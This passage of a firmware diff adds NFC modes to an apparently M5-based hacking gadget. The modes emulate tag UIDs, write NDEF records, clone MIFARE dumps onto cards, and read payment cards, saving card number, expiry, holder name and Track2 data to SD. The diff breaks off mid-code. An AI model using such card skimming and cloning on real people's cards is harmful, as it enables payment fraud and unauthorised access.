+                            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Emulating UID");
+                            sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                            sp.setCursor(10, 30); sp.print("UID: ");
+                            for (int i = 0; i < card.uid_len; i++) sp.printf("%02X ", card.uid[i]);
+                            sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                            sp.setCursor(10, 55); sp.print("Target mode active...");
+                            sp.setCursor(10, 70); sp.printf("ATQA:%04X SAK:%02X", card.atqa, card.sak);
+                            sp.fillRect(0, H-14, W, 14, 0x0841);
+                            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=stop");
+                            if (use_sprite) sprite->pushSprite(0, 0);
+                            nfc_emulate_uid(card.uid, card.uid_len, card.atqa, card.sak, 120);
+                            nfc_close(); nfc_open();
+                            goto read_scan_again;
+                        }
+                        delay(10);
+                    }
+                    break;
+                }
+                read_scan_again:;
+            }
+            read_done:;
+
+        // ── Mode 2: Saved Tags ──
+        }
+        if (mode == 2) {
+            File dir = SD.open("/evil/nfc");
+            String files[20]; int file_count = 0;
+            if (dir) {
+                while (File entry = dir.openNextFile()) {
+                    if (!entry.isDirectory() && file_count < 20)
+                        files[file_count++] = String("/evil/nfc/") + entry.name();
+                    entry.close();
+                }
+                dir.close();
+            }
+            if (file_count == 0) {
+                sp.fillScreen(TFT_BLACK);
+                sp.setTextColor(TFT_RED, TFT_BLACK);
+                sp.setCursor(10, 55); sp.print("No saved tags in /evil/nfc/");
+                if (use_sprite) sprite->pushSprite(0, 0);
+                delay(2000);
+            } else {
+                int sel = 0, scroll = 0;
+                while (true) {
+                    int visible = min(file_count - scroll, 7);
+                    sp.fillScreen(TFT_BLACK);
+                    sp.fillRect(0, 0, W, 14, 0x0841);
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
+                    sp.printf("Saved (%d tags)", file_count);
+                    for (int i = 0; i < visible; i++) {
+                        int idx = scroll + i;
+                        bool s = (idx == sel);
+                        sp.setTextColor(s ? TFT_GREEN : TFT_DARKGREEN, TFT_BLACK);
+                        sp.setCursor(4, 18 + i * 14);
+                        String fn = files[idx].substring(files[idx].lastIndexOf('/') + 1);
+                        if (fn.length() > 30) fn = fn.substring(0, 30);
+                        sp.print(s ? "> " : "  "); sp.print(fn);
+                    }
+                    sp.fillRect(0, H-14, W, 14, 0x0841);
+                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
+                    sp.print("TAB=dn ENT=view DEL=rm BACK=menu");
+                    if (use_sprite) sprite->pushSprite(0, 0);
+
+                    while (true) {
+                        M5.update(); cardUpdate();
+                        if (kp(KEY_BACKSPACE)) { keyRelease(); goto saved_done; }
+                        if (kp('.') || kp(',')) {
+                            keyRelease(); sel = (sel + 1) % file_count;
+                            if (sel >= scroll + 7) scroll = sel - 6;
+                            if (sel < scroll) scroll = sel;
+                            break;
+                        }
+                        if (kp(KEY_TAB) || kp(';')) {
+                            keyRelease(); sel = (sel - 1 + file_count) % file_count;
+                            if (sel < scroll) scroll = sel;
+                            if (sel >= scroll + 7) scroll = sel - 6;
+                            break;
+                        }
+                        if (kp(KEY_DELETE) || kp('d') || kp('D')) {
+                            keyRelease();
+                            // Confirmation popup
+                            String fn_del = files[sel].substring(files[sel].lastIndexOf('/') + 1);
+                            sp.fillScreen(TFT_BLACK);
+                            sp.setTextColor(TFT_RED, TFT_BLACK);
+                            sp.setCursor(10, 40); sp.print("Delete this file?");
+                            sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                            sp.setCursor(10, 60); sp.print(fn_del);
+                            sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                            sp.setCursor(10, 90); sp.print("ENTER=Yes  BACK=No");
+                            if (use_sprite) sprite->pushSprite(0, 0);
+                            bool confirmed = false;
+                            while (true) {
+                                M5.update(); cardUpdate();
+                                if (kp(KEY_ENTER)) { keyRelease(); confirmed = true; break; }
+                                if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                                delay(10);
+                            }
+                            if (confirmed) {
+                                SD.remove(files[sel].c_str());
+                                for (int i = sel; i < file_count-1; i++) files[i] = files[i+1];
+                                file_count--;
+                                if (file_count == 0) goto saved_done;
+                                if (sel >= file_count) sel = file_count - 1;
+                            }
+                            break;
+                        }
+                        if (kp(KEY_ENTER)) {
+                            keyRelease();
+                            // Read file into lines for two-page view
+                            File f = SD.open(files[sel]);
+                            if (f) {
+                                String info_lines[20]; int info_count = 0;
+                                String block_lines[80]; int block_count = 0;
+                                while (f.available()) {
+                                    String line = f.readStringUntil('\n'); line.trim();
+                                    if (line.startsWith("Block ") && block_count < 80) {
+                                        block_lines[block_count++] = line;
+                                    } else if (line.length() > 0 && info_count < 20) {
+                                        info_lines[info_count++] = line;
+                                    }
+                                }
+                                f.close();
+
+                                // Page 1: Card info (scrollable for EMV with many fields)
+                                bool show_blocks = false;
+                                int blk_scroll = 0;
+                                int info_scroll = 0;
+                                const int info_visible = 8;
+                                while (true) {
+                                    sp.fillScreen(TFT_BLACK);
+                                    sp.fillRect(0, 0, W, 14, 0x0841);
+                                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
+                                    String fn = files[sel].substring(files[sel].lastIndexOf('/') + 1);
+                                    sp.print(fn);
+
+                                    if (!show_blocks) {
+                                        sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                                        int vis = min(info_visible, info_count - info_scroll);
+                                        for (int i = 0; i < vis; i++) {
+                                            sp.setCursor(4, 18 + i * 13);
+                                            sp.print(info_lines[info_scroll + i].substring(0, 38));
+                                        }
+                                        sp.fillRect(0, H-14, W, 14, 0x0841);
+                                        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
+                                        if (info_count > info_visible)
+                                            sp.printf(".,=pg E=Emu %s BACK", block_count > 0 ? "D=Data" : "");
+                                        else if (block_count > 0)
+                                            sp.printf("E=Emu D=Data(%d) BACK=list", block_count);
+                                        else
+                                            sp.print("E=Emulate  BACK=list");
+                                    } else {
+                                        sp.setTextColor(TFT_CYAN, TFT_BLACK);
+                                        int visible = min(8, block_count - blk_scroll);
+                                        for (int i = 0; i < visible; i++) {
+                                            sp.setCursor(2, 18 + i * 13);
+                                            sp.print(block_lines[blk_scroll + i].substring(0, 39));
+                                        }
+                                        sp.fillRect(0, H-14, W, 14, 0x0841);
+                                        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
+                                        sp.printf(".,/=scroll %d/%d BACK=info", blk_scroll/8+1, (block_count+7)/8);
+                                    }
+                                    if (use_sprite) sprite->pushSprite(0, 0);
+
+                                    while (true) {
+                                        M5.update(); cardUpdate();
+                                        if (kp(KEY_BACKSPACE)) {
+                                            keyRelease();
+                                            if (show_blocks) { show_blocks = false; break; }
+                                            else goto detail_done;
+                                        }
+                                        if (!show_blocks && (kp('d') || kp('D')) && block_count > 0) {
+                                            keyRelease(); show_blocks = true; blk_scroll = 0; break;
+                                        }
+                                        if (!show_blocks && info_count > info_visible && (kp('.') || kp(','))) {
+                                            keyRelease();
+                                            info_scroll = min(info_scroll + info_visible, max(0, info_count - info_visible));
+                                            break;
+                                        }
+                                        if (!show_blocks && info_count > info_visible && (kp(KEY_TAB) || kp(';'))) {
+                                            keyRelease();
+                                            info_scroll = max(info_scroll - info_visible, 0);
+                                            break;
+                                        }
+                                        if (show_blocks && (kp('.') || kp(','))) {
+                                            keyRelease();
+                                            blk_scroll = min(blk_scroll + 8, max(0, block_count - 8));
+                                            break;
+                                        }
+                                        if (show_blocks && (kp(KEY_TAB) || kp(';'))) {
+                                            keyRelease();
+                                            blk_scroll = max(blk_scroll - 8, 0);
+                                            break;
+                                        }
+                                        if (!show_blocks && (kp('e') || kp('E'))) { break; } // fall through to emulate
+                                        delay(10);
+                                    }
+                                    if (!show_blocks && (kp('e') || kp('E'))) break; // exit to emulate handler
+                                }
+                                detail_done:
+                                if (!(kp('e') || kp('E'))) { break; } // back to file list
+                                // Fall through to emulate handler
+                                keyRelease();
+                                    {
+                                        // Parse UID from file for emulation
+                                        File ef = SD.open(files[sel]);
+                                        uint8_t emu_uid[10]; int emu_len = 0;
+                                        if (ef) {
+                                            while (ef.available()) {
+                                                String line = ef.readStringUntil('\n');
+                                                line.trim();
+                                                if (line.startsWith("UID:")) {
+                                                    String uidstr = line.substring(4);
+                                                    uidstr.trim();
+                                                    int pos = 0;
+                                                    while (pos < (int)uidstr.length() && emu_len < 10) {
+                                                        while (pos < (int)uidstr.length() && uidstr[pos] == ' ') pos++;
+                                                        if (pos + 1 < (int)uidstr.length()) {
+                                                            emu_uid[emu_len++] = (uint8_t)strtol(uidstr.substring(pos, pos+2).c_str(), NULL, 16);
+                                                            pos += 2;
+                                                        } else break;
+                                                    }
+                                                    break;
+                                                }
+                                            }
+                                            ef.close();
+                                        }
+                                        if (emu_len > 0) {
+                                            sp.fillScreen(TFT_BLACK);
+                                            sp.fillRect(0, 0, W, 14, 0x0841);
+                                            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Emulating UID");
+                                            sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                                            sp.setCursor(10, 30); sp.print("UID: ");
+                                            for (int i = 0; i < emu_len; i++) sp.printf("%02X ", emu_uid[i]);
+                                            sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                                            sp.setCursor(10, 55); sp.print("Target mode active...");
+                                            sp.fillRect(0, H-14, W, 14, 0x0841);
+                                            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=stop");
+                                            if (use_sprite) sprite->pushSprite(0, 0);
+                                            uint16_t emu_atqa = 0x0004; uint8_t emu_sak = 0x08;
+                                            nfc_emulate_uid(emu_uid, emu_len, emu_atqa, emu_sak, 120);
+                                            nfc_close(); nfc_open();
+                                        }
+                                        break;
+                                    }
+                                    delay(10);
+                                }
+                            }
+                            break;
+                        }
+                        delay(10);
+                    }
+                }
+                saved_done:;
+            }
+
+        // ── Mode 3: EMV Reader (with timeout to prevent freeze) ──
+        if (mode == 3) {
+            sp.fillScreen(TFT_BLACK);
+            sp.fillRect(0, 0, W, 14, 0x0841);
+            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("EMV Reader");
+            sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+            sp.setCursor(30, 55); sp.print("Tap payment card...");
+            sp.fillRect(0, H-14, W, 14, 0x0841);
+            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=menu");
+            if (use_sprite) sprite->pushSprite(0, 0);
+
+            while (true) {
+                M5.update(); cardUpdate();
+                if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+
+                NfcCardInfo card = nfc_activate();
+                if (card.valid) {
+                    Serial.printf("[EMV] Got card: SAK=0x%02X valid=%d\n", card.sak, card.valid);
+                }
+                if (card.valid && (card.sak & 0x20)) {
+                    Serial.printf("[EMV] Card: UID=");
+                    for (int i = 0; i < card.uid_len; i++) Serial.printf("%02X", card.uid[i]);
+                    Serial.printf(" ATQA=%04X SAK=%02X\n", card.atqa, card.sak);
+                    // RATS IMMEDIATELY after activation
+                    uint8_t rats[] = {0xE0, 0x80};
+                    int rx_len = 0;
+                    Serial.println("[EMV] Sending RATS E0 80...");
+                    uint8_t* rats_resp = nfc_transceive(rats, 2, &rx_len, 50);
+                    Serial.printf("[EMV] RATS resp: %d bytes\n", rx_len);
+                    if (rats_resp && rx_len > 0) {
+                        Serial.print("[EMV] ATS: ");
+                        for (int i = 0; i < min(rx_len, 20); i++) Serial.printf("%02X ", rats_resp[i]);
+                        Serial.println();
+                    }
+
+                    // Now safe to update display
+                    sp.fillScreen(TFT_BLACK);
+                    sp.fillRect(0, 0, W, 14, 0x0841);
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Reading EMV...");
+                    if (use_sprite) sprite->pushSprite(0, 0);
+
+                    EmvCard emv = {};
+                    if (rats_resp && rx_len > 0) {
+                        emv = nfc_read_emv();
+                    } else {
+                        Serial.println("[EMV] RATS failed - no ATS from card");
+                    }
+
+                    sp.fillScreen(TFT_BLACK);
+                    sp.fillRect(0, 0, W, 14, 0x0841);
+                    sp.drawFastHLine(0, 14, W, 0xFC00);
+                    sp.setTextSize(1); sp.setTextFont(1);
+
+                    if (emv.valid) {
+                        // 1. App name (orange header)
+                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
+                        sp.printf("%s", emv.app_label[0] ? emv.app_label : emv.card_type);
+
+                        int y = 18;
+                        // 2. PAN — green, prominent
+                        sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                        sp.setCursor(4, y); sp.print(emv.pan);
+                        y += 13;
+
+                        // 3. Expiry (+ effective if present)
+                        if (emv.expiry[0]) {
+                            sp.setTextColor(0xBDF7, TFT_BLACK); // light gray
+                            sp.setCursor(4, y);
+                            sp.printf("Exp: %s", emv.expiry);
+                            if (emv.effective[0]) sp.printf("  Active: %s", emv.effective);
+                            y += 11;
+                        }
+
+                        // 4. Cardholder name (skip if empty or just "/")
+                        if (emv.holder[0] && strcmp(emv.holder, "/") != 0
+                            && strcmp(emv.holder, " /") != 0 && strcmp(emv.holder, "  /") != 0) {
+                            sp.setTextColor(0xBDF7, TFT_BLACK);
+                            sp.setCursor(4, y); sp.print(emv.holder);
+                            y += 11;
+                        }
+
+                        // 5. Country - Currency (resolved names)
+                        if (emv.country_code || emv.currency_code) {
+                            sp.setTextColor(0x7BEF, TFT_BLACK); // darker gray
+                            sp.setCursor(4, y);
+                            if (emv.country_code && emv.currency_code)
+                                sp.printf("%s - %s", emv_country_name(emv.country_code), emv_currency_name(emv.currency_code));
+                            else if (emv.country_code)
+                                sp.printf("%s", emv_country_name(emv.country_code));
+                            else
+                                sp.printf("%s", emv_currency_name(emv.currency_code));
+                            y += 11;
+                        }
+
+                        // 6. Track2 raw hex (cyan)
+                        if (emv.track2[0]) {
+                            sp.setTextColor(TFT_CYAN, TFT_BLACK);
+                            sp.setCursor(4, y); sp.printf("%s", emv.track2);
+                            y += 11;
+                        }
+
+                        // 7-9. ATC, PIN tries, Language
+                        sp.setTextColor(0x7BEF, TFT_BLACK);
+                        if (emv.atc || emv.pin_tries) {
+                            sp.setCursor(4, y);
+                            if (emv.atc) sp.printf("Tx:%d", emv.atc);
+                            if (emv.pin_tries) sp.printf("  PIN:%d left", emv.pin_tries);
+                            if (emv.language[0]) sp.printf("  Lang:%s", emv.language);
+                            y += 11;
+                        }
+
+                        // 10. CVM / Auth methods (orange)
+                        if (emv.auth_method[0]) {
+                            sp.setTextColor(0xFC00, TFT_BLACK);
+                            sp.setCursor(4, y); sp.printf("Auth:%s", emv.auth_method);
+                            y += 11;
+                        }
+
+                        // 11. Usage (green)
+                        if (emv.usage[0]) {
+                            sp.setTextColor(TFT_DARKGREEN, TFT_BLACK);
+                            sp.setCursor(4, y); sp.printf("Use:%s", emv.usage);
+                            y += 11;
+                        }
+                    } else {
+                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
+                        sp.print("EMV Read");
+                        sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                        if (!rats_resp || rx_len == 0) {
+                            sp.setCursor(10, 25); sp.print("RATS failed (no ATS)");
+                        } else if (emv.card_type[0]) {
+                            sp.setCursor(10, 25); sp.printf("Type: %s", emv.card_type);
+                            sp.setCursor(10, 40); sp.print("PAN not found in records");
+                        } else {
+                            sp.setCursor(10, 25); sp.print("Could not read EMV data");
+                        }
+                        sp.setTextColor(TFT_DARKGREEN, TFT_BLACK);
+                        sp.setCursor(10, 60); sp.print("UID: ");
+                        for (int i = 0; i < card.uid_len; i++) sp.printf("%02X ", card.uid[i]);
+                        sp.setCursor(10, 75); sp.printf("ATQA:%04X SAK:%02X", card.atqa, card.sak);
+                    }
+
+                    sp.fillRect(0, H-14, W, 14, 0x0841);
+                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
+                    sp.print(emv.valid ? "ENTER=Save BACK=menu" : "BACK=menu");
+                    if (use_sprite) sprite->pushSprite(0, 0);
+
+                    while (true) {
+                        M5.update(); cardUpdate();
+                        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                        if (emv.valid && kp(KEY_ENTER)) {
+                            keyRelease();
+                            SD.mkdir("/evil/nfc");
+                            char emv_fname[64];
+                            snprintf(emv_fname, sizeof(emv_fname), "/evil/nfc/emv_%lu.txt", millis());
+                            File ef = SD.open(emv_fname, FILE_WRITE);
+                            if (ef) {
+                                ef.printf("Type: EMV\n");
+                                ef.printf("UID:");
+                                for (int i = 0; i < card.uid_len; i++) ef.printf(" %02X", card.uid[i]);
+                                ef.printf("\nATQA: %04X\nSAK: %02X\n", card.atqa, card.sak);
+                                if (emv.app_label[0]) ef.printf("App: %s\n", emv.app_label);
+                                if (emv.card_type[0]) ef.printf("CardType: %s\n", emv.card_type);
+                                if (emv.pan[0]) ef.printf("PAN: %s\n", emv.pan);
+                                if (emv.expiry[0]) ef.printf("Expiry: %s\n", emv.expiry);
+                                if (emv.effective[0]) ef.printf("Effective: %s\n", emv.effective);
+                                if (emv.holder[0]) ef.printf("Holder: %s\n", emv.holder);
+                                if (emv.aid_hex[0]) ef.printf("AID: %s\n", emv.aid_hex);
+                                if (emv.country_code) ef.printf("Country: %s (%04X)\n", emv_country_name(emv.country_code), emv.country_code);
+                                if (emv.currency_code) ef.printf("Currency: %s (%04X)\n", emv_currency_name(emv.currency_code), emv.currency_code);
+                                if (emv.language[0]) ef.printf("Language: %s\n", emv.language);
+                                if (emv.track2[0]) ef.printf("Track2: %s\n", emv.track2);
+                                if (emv.atc) ef.printf("ATC: %d\n", emv.atc);
+                                if (emv.pin_tries) ef.printf("PINtries: %d\n", emv.pin_tries);
+                                if (emv.auth_method[0]) ef.printf("Auth: %s\n", emv.auth_method);
+                                if (emv.usage[0]) ef.printf("Usage: %s\n", emv.usage);
+                                ef.close();
+                                sp.fillRect(0, 95, W, 20, TFT_BLACK);
+                                sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                                sp.setCursor(4, 98); sp.printf("Saved: %s", emv_fname + 10);
+                                if (use_sprite) sprite->pushSprite(0, 0);
+                                delay(1500);
+                            }
+                            break;
+                        }
+                        delay(10);
+                    }
+                    break;
+                }
+                delay(300);
+            }
+        } // end mode 3
+
+        // (Old Emulate mode removed from menu — emulation via E key in Read/Saved)
+        if (mode == -99) { // dead code, kept for reference
+            File dir = SD.open("/evil/nfc");
+            String files[20]; int file_count = 0;
+            if (dir) {
+                while (File entry = dir.openNextFile()) {
+                    if (!entry.isDirectory() && file_count < 20)
+                        files[file_count++] = String("/evil/nfc/") + entry.name();
+                    entry.close();
+                }
+                dir.close();
+            }
+            if (file_count == 0) {
+                sp.fillScreen(TFT_BLACK);
+                sp.setTextColor(TFT_RED, TFT_BLACK);
+                sp.setCursor(10, 50); sp.print("No saved tags to emulate");
+                sp.setCursor(10, 65); sp.print("Read a tag first (mode 1)");
+                if (use_sprite) sprite->pushSprite(0, 0);
+                delay(2000);
+            } else {
+                int sel = 0;
+                while (true) {
+                    sp.fillScreen(TFT_BLACK);
+                    sp.fillRect(0, 0, W, 14, 0x0841);
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Emulate - Select Tag");
+                    for (int i = 0; i < min(file_count, 7); i++) {
+                        bool s = (i == sel);
+                        sp.setTextColor(s ? TFT_GREEN : TFT_DARKGREEN, TFT_BLACK);
+                        sp.setCursor(4, 18 + i * 14);
+                        String fn = files[i].substring(files[i].lastIndexOf('/') + 1);
+                        sp.print(s ? "> " : "  "); sp.print(fn);
+                    }
+                    sp.fillRect(0, H-14, W, 14, 0x0841);
+                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
+                    sp.print("TAB=dn ENTER=emulate BACK=menu");
+                    if (use_sprite) sprite->pushSprite(0, 0);
+
+                    while (true) {
+                        M5.update(); cardUpdate();
+                        if (kp(KEY_BACKSPACE)) { keyRelease(); goto emu_done; }
+                        if (kp(KEY_TAB) || kp(';')) {
+                            keyRelease(); sel = (sel + 1) % file_count; break;
+                        }
+                        if (kp('.')) {
+                            keyRelease(); sel = (sel - 1 + file_count) % file_count; break;
+                        }
+                        if (kp(KEY_ENTER)) {
+                            keyRelease();
+                            // Parse UID from selected file
+                            File ef = SD.open(files[sel]);
+                            uint8_t emu_uid[10]; int emu_len = 0;
+                            if (ef) {
+                                while (ef.available()) {
+                                    String line = ef.readStringUntil('\n');
+                                    line.trim();
+                                    if (line.startsWith("UID:")) {
+                                        String uidstr = line.substring(4);
+                                        uidstr.trim();
+                                        int pos = 0;
+                                        while (pos < (int)uidstr.length() && emu_len < 10) {
+                                            while (pos < (int)uidstr.length() && uidstr[pos] == ' ') pos++;
+                                            if (pos + 1 < (int)uidstr.length()) {
+                                                emu_uid[emu_len++] = (uint8_t)strtol(uidstr.substring(pos, pos+2).c_str(), NULL, 16);
+                                                pos += 2;
+                                            } else break;
+                                        }
+                                        break;
+                                    }
+                                }
+                                ef.close();
+                            }
+                            if (emu_len > 0) {
+                                sp.fillScreen(TFT_BLACK);
+                                sp.fillRect(0, 0, W, 14, 0x0841);
+                                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Emulating UID");
+                                sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                                sp.setCursor(10, 30); sp.print("UID: ");
+                                for (int i = 0; i < emu_len; i++) sp.printf("%02X ", emu_uid[i]);
+                                sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                                sp.setCursor(10, 55); sp.print("Target mode active...");
+                                sp.fillRect(0, H-14, W, 14, 0x0841);
+                                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=stop");
+                                if (use_sprite) sprite->pushSprite(0, 0);
+                                uint16_t ea = 0x0004; uint8_t es = 0x08;
+                                nfc_emulate_uid(emu_uid, emu_len, ea, es, 120);
+                                nfc_close(); nfc_open();
+                            } else {
+                                sp.fillScreen(TFT_BLACK);
+                                sp.setTextColor(TFT_RED, TFT_BLACK);
+                                sp.setCursor(10, 55); sp.print("No UID found in file");
+                                if (use_sprite) sprite->pushSprite(0, 0);
+                                delay(1500);
+                            }
+                            break;
+                        }
+                        delay(10);
+                    }
+                }
+                emu_done:;
+            }
+        }
+
+        // ── Mode 4: Write NDEF ──
+        if (mode == 4) {
+            // Sub-menu: URL or Text
+            sp.fillScreen(TFT_BLACK);
+            sp.fillRect(0, 0, W, 14, 0x0841);
+            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Write NDEF");
+            sp.setTextColor(TFT_CYAN, TFT_BLACK);
+            sp.setCursor(10, 24); sp.print("1. URL");
+            sp.setCursor(10, 40); sp.print("2. Text");
+            sp.fillRect(0, H-14, W, 14, 0x0841);
+            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("1-2=select BACK=menu");
+            if (use_sprite) sprite->pushSprite(0, 0);
+
+            int ndef_type = 0;
+            while (!ndef_type) {
+                M5.update(); cardUpdate();
+                if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                if (kp('1')) ndef_type = 1;
+                if (kp('2')) ndef_type = 2;
+                delay(10);
+            }
+            keyRelease();
+
+            // Text input via keyboard
+            char input_buf[128] = {};
+            int input_pos = 0;
+            const char* prompt = (ndef_type == 1) ? "Enter URL:" : "Enter text:";
+            if (ndef_type == 1) { strcpy(input_buf, "https://"); input_pos = 8; }
+
+            while (true) {
+                sp.fillScreen(TFT_BLACK);
+                sp.fillRect(0, 0, W, 14, 0x0841);
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print(prompt);
+                sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                // Show text with word wrap
+                sp.setCursor(4, 20);
+                for (int ci = 0; ci < input_pos; ci++) {
+                    sp.print(input_buf[ci]);
+                }
+                sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.print("_");
+                sp.fillRect(0, H-14, W, 14, 0x0841);
+                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
+                sp.printf("ENTER=write  len:%d", input_pos);
+                if (use_sprite) sprite->pushSprite(0, 0);
+
+                M5.update(); cardUpdate();
+                if (kp(KEY_ENTER) && input_pos > 0) { keyRelease(); break; }
+                if (kp(KEY_BACKSPACE) && input_pos > 0) { input_buf[--input_pos] = 0; keyRelease(); continue; }
+                if (kp(KEY_BACKSPACE) && input_pos == 0) { keyRelease(); break; }
+                // Scan printable ASCII keys
+                for (char c = ' '; c <= '~'; c++) {
+                    if (kp(c) && input_pos < 126) {
+                        input_buf[input_pos++] = c;
+                        input_buf[input_pos] = 0;
+                        keyRelease();
+                        break;
+                    }
+                }
+                delay(20);
+            }
+
+            // Encode NDEF
+            uint8_t ndef_rec[200];
+            int rec_len = 0;
+            if (ndef_type == 1) rec_len = nfc_ndef_encode_url(input_buf, ndef_rec, sizeof(ndef_rec));
+            else rec_len = nfc_ndef_encode_text(input_buf, ndef_rec, sizeof(ndef_rec));
+
+            if (rec_len == 0) {
+                sp.fillScreen(TFT_BLACK);
+                sp.setTextColor(TFT_RED, TFT_BLACK);
+                sp.setCursor(10, 50); sp.print("Encode failed");
+                if (use_sprite) sprite->pushSprite(0, 0);
+                delay(2000); break;
+            }
+
+            uint8_t tlv_buf[220];
+            int tlv_len = nfc_ndef_wrap_tlv(ndef_rec, rec_len, tlv_buf, sizeof(tlv_buf));
+
+            // Place tag screen
+            sp.fillScreen(TFT_BLACK);
+            sp.fillRect(0, 0, W, 14, 0x0841);
+            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Write NDEF");
+            sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+            sp.setCursor(20, 50); sp.print("Place NTAG/Ultralight...");
+            sp.fillRect(0, H-14, W, 14, 0x0841);
+            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=cancel");
+            if (use_sprite) sprite->pushSprite(0, 0);
+
+            while (true) {
+                M5.update(); cardUpdate();
+                if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+
+                NfcCardInfo card = nfc_activate();
+                if (card.valid && (card.sak == 0x00 || card.sak == 0x04)) {
+                    sp.fillScreen(TFT_BLACK);
+                    sp.setTextColor(TFT_CYAN, TFT_BLACK);
+                    sp.setCursor(10, 30); sp.print("Writing...");
+                    sp.setCursor(10, 45); sp.printf("%d bytes → %d pages", tlv_len, (tlv_len+3)/4);
+                    if (use_sprite) sprite->pushSprite(0, 0);
+
+                    bool ok = nfc_write_ndef(tlv_buf, tlv_len);
+                    sp.fillScreen(TFT_BLACK);
+                    if (ok) {
+                        sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                        sp.setCursor(10, 50); sp.print("NDEF written!");
+                    } else {
+                        sp.setTextColor(TFT_RED, TFT_BLACK);
+                        sp.setCursor(10, 50); sp.print("Write failed!");
+                    }
+                    sp.setTextColor(0x5AEB, TFT_BLACK);
+                    sp.setCursor(10, 75); sp.print("BACK=menu");
+                    if (use_sprite) sprite->pushSprite(0, 0);
+                    while (true) {
+                        M5.update(); cardUpdate();
+                        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                        delay(10);
+                    }
+                    break;
+                }
+                delay(200);
+            }
+            // ndef write done
+        }
+
+        // ── Mode 5: Write Clone (MIFARE Classic dump to target card) ──
+        if (mode == 5) {
+            // List saved .nfc files
+            File dir = SD.open("/evil/nfc");
+            String files[20]; int file_count = 0;
+            if (dir) {
+                while (File entry = dir.openNextFile()) {
+                    if (!entry.isDirectory() && file_count < 20) {
+                        String fn = String(entry.name());
+                        if (fn.endsWith(".nfc") || fn.endsWith(".txt"))
+                            files[file_count++] = String("/evil/nfc/") + entry.name();
+                    }
+                    entry.close();
+                }
+                dir.close();
+            }
+            if (file_count == 0) {
+                sp.fillScreen(TFT_BLACK);
+                sp.setTextColor(TFT_RED, TFT_BLACK);
+                sp.setCursor(10, 55); sp.print("No saved dumps found");
+                if (use_sprite) sprite->pushSprite(0, 0);
+                delay(2000);
+            } else {
+                int sel = 0;
+                bool selecting = true;
+                while (selecting) {
+                    sp.fillScreen(TFT_BLACK);
+                    sp.fillRect(0, 0, W, 14, 0x0841);
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Write Clone");
+                    for (int i = 0; i < min(file_count, 7); i++) {
+                        sp.setTextColor(i == sel ? TFT_GREEN : TFT_DARKGREEN, TFT_BLACK);
+                        sp.setCursor(4, 18 + i * 14);
+                        String fn = files[i].substring(files[i].lastIndexOf('/') + 1);
+                        sp.print(i == sel ? "> " : "  "); sp.print(fn);
+                    }
+                    sp.fillRect(0, H-14, W, 14, 0x0841);
+                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
+                    sp.print(".,=dn TAB=up ENTER=write");
+                    if (use_sprite) sprite->pushSprite(0, 0);
+
+                    while (true) {
+                        M5.update(); cardUpdate();
+                        if (kp(KEY_BACKSPACE)) { keyRelease(); selecting = false; break; }
+                        if (kp('.') || kp(',')) { keyRelease(); sel = (sel + 1) % file_count; break; }
+                        if (kp(KEY_TAB) || kp(';')) { keyRelease(); sel = (sel - 1 + file_count) % file_count; break; }
+                        if (kp(KEY_ENTER)) {
+                            keyRelease();
+                            // Parse dump file
+                            uint8_t dump_blocks[64][16];
+                            uint8_t dump_uid[10]; int dump_uid_len = 0;
+                            int n_blocks = nfc_parse_dump(files[sel].c_str(), dump_blocks, 64, dump_uid, &dump_uid_len);
+                            if (n_blocks == 0) {
